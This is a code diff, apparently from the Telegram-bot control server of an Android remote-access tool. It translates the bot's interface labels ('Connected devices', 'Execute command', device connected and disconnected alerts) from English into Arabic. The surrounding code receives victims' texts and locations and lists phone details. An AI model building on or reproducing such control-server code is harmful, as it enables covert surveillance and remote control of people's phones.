@@ -93,7 +93,7 @@ app.post("/uploadText", (req, res) => {
     {
       parse_mode: "HTML",
         "reply_markup": {
-          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+          "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
           'resize_keyboard': true
     }
 },  {parse_mode: "HTML", disable_web_page_preview: true})
@@ -105,7 +105,7 @@ app.post("/uploadLocation", (req, res) => {
     {
       parse_mode: "HTML",
         "reply_markup": {
-          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+          "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
           'resize_keyboard': true
     }
 },  {parse_mode: "HTML"})
@@ -128,7 +128,7 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+        `°• اتصال جهاز جديد\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
         `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
         `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -138,7 +138,7 @@ appSocket.on('connection', (ws, req) => {
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
-            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+            `°• قطع الاتصال مع الجهاز\n\n` +
             `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
             `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
             `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
